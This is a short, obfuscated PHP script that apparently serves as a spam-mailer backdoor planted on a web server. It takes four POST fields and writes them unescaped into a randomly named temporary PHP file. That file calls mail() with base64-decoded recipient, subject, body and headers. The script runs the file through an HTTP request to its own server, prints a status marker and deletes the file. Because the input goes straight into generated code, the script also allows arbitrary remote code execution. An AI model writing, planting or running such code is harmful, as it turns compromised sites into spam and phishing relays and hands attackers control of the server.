<?php 
$jewrqwbnlk = $_POST['ylxqjqbcn']; 
$xaouf = $_POST['nrsf']; 
$jwgpxlzblkepa = $_POST['tdluhqtnmzr'];  
$fcublsqtpae = $_POST['qqifquaqdzvp'];  

if (isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS'] == 'on' || $_SERVER['HTTPS'] == 1) || isset($_SERVER['HTTP_X_FORWARDED_PROTO']) &&  $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') { $protocol = 'https://'; } else {  $protocol = 'http://';}
function generateRandomString($length = 15) {return substr(sha1(rand()), 0, $length);}

$php_tmp_file = generateRandomString(mt_rand(3,12)) . '.php';
$r_url = $protocol . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . '/' . $php_tmp_file;
$file_body = "<?php if (mail(base64_decode('$jewrqwbnlk'),base64_decode('$xaouf'), base64_decode('$jwgpxlzblkepa'), base64_decode('$fcublsqtpae') )) {echo 'vwkxlpc';} else {echo 'yfbhn :';} ";
file_put_contents($php_tmp_file, $file_body);

echo file_get_contents($r_url);
unlink($php_tmp_file);




